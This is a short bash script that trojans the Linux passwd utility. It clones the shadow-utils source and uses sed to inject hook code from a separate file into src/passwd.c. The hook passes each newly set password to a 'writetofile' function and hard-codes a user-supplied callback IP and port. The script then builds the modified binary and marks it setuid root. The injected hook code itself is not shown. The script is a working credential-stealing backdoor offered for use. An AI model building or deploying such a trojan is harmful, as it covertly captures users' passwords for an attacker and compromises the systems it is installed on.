#!/bin/bash

## Check if Root ##
if [ "$EUID" -ne 0 ]; then 
  echo "Must run as superuser"
  exit
fi

## Get Variables ##
echo -n "Enter the IP Address to Callback to : "
read ip
echo -n "Set the destination port : "
read port
echo -ne "Confirm these settings [y/n]\nIP : ${ip}\n Port : ${port}"
read pass
if [[ $pass == n ]]; then
    exit 0
fi

## Get dependancies and autogen ##
sudo apt install -y git make 
sudo apt-get build-dep -y shadow
git clone https://github.com/shadow-maint/shadow
cd shadow
./autogen.sh

## Add Inject Code ##

# Assign Code to Paste
imports=$(head -n 4 hook_code.txt)
def_var="#define IP ${ip}"
def_port="#define PORT ${port}" 
code=$(tail -n 10 hook_code.txt)

# Inject Code
sed -i "/salt = crypt_make_salt (NULL, NULL);/i \      writetofile(pass);" src/passwd.c

# Add Imports
sed -i "/#include \"shadowio.h\"/a $imports" src/passwd.c

# Add Variables
sed -i "/#include <string.h>/a $def_var\n $def_port" src/passwd.c

# Add Hook
sed -i "/static int new_password/i $code;" src/passwd.c


## Make ##
sudo make all
chmod 4755 shadow/src/passwd 